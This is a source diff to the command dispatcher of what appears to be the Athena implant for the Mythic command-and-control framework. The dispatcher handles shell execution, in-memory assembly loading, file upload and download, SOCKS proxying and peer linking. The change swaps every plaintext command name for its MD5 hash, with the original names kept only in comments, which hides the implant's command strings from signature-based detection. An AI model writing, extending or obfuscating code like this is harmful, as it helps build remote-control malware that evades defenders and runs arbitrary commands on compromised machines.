@@ -51,25 +51,25 @@ namespace Athena.Commands
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true;
 
-            switch (job.task.command)
+            switch (Misc.CreateMD5(job.task.command.ToLower())) //To lower "just in case"
             {
-                case "download": //Can likely be dynamically loaded
+                case "FD456406745D816A45CAE554C788E754": //download
                     if (!await downloadHandler.ContainsJob(job.task.id))
                     {
                         this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
                     }
                     break;
-                case "execute-assembly": //Should be able to stop it
+                case "C6E6495DF88816EAC7376920027393A4": //execute-assembly
                     this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
                     break;
-                case "exit":
+                case "F24F62EEB789199B9B2E467DF3B1876B": //Exit
                     RequestExit(job);
                     break;
-                case "jobs": //Can likely be dynamically loaded
+                case "27A06A9E3D5E7F67EB604A39536208C9": //jobs
                     this.responseResults.Add(await this.GetJobs(task.id));
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "jobkill": //Maybe can be loaded? //Also add a kill command for processes
+                case "363AFEF7C118EEDBD908495180280BB7": //jobkill
                     if (this.activeJobs.ContainsKey(task.parameters))
                     {
                         this.activeJobs[task.parameters].cancellationtokensource.Cancel();
@@ -92,31 +92,31 @@ namespace Athena.Commands
                     }
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "link":
+                case "2A304A1348456CCD2234CD71A81BD338": //link
                     StartInternalForwarder(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "load":
+                case "EC4D1EB36B22D19728E9D1D23CA84D1C": //load
                     this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "load-assembly":
+                case "790C1BE487AC4162A26A760E50AE619A": //load-assembly
                     this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job));
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "reset-assembly-context":
+                case "E659634F6A18B0CACD0AB3C3A95845A7": //reset-assembly-context
                     this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "shell": //Can be dynamically loaded
+                case "2591C98B70119FE624898B1E424B5E91": //shell
                     this.responseResults.Add(await this.shellHandler.ShellExec(job));
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "sleep":
+                case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                     UpdateSleepAndJitter(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
+                case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
                     var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                     if((string)socksInfo["action"] == "start")
                     {
@@ -128,7 +128,7 @@ namespace Athena.Commands
                     }
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "stop-assembly":
+                case "5D343B8042C5EE2EA7C892C5ECC16E30": //stop-assembly
                     this.responseResults.Add(new ResponseResult
                     {
                         user_output = "Not implemented yet.",
@@ -137,14 +137,14 @@ namespace Athena.Commands
                     });
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "unlink":
+                case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                     StopInternalForwarder(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "unload":
+                case "F972C1D6198BAF47DD8FD9A05832DB0F": //unload
                     
                     break;
-                case "upload": //Can likely be dynamically loaded
+                case "76EE3DE97A1B8B903319B7C013D8C877": //upload
                     if(!await downloadHandler.ContainsJob(job.task.id))
                     {
                         this.responseResults.Add(await uploadHandler.StartUploadJob(job));
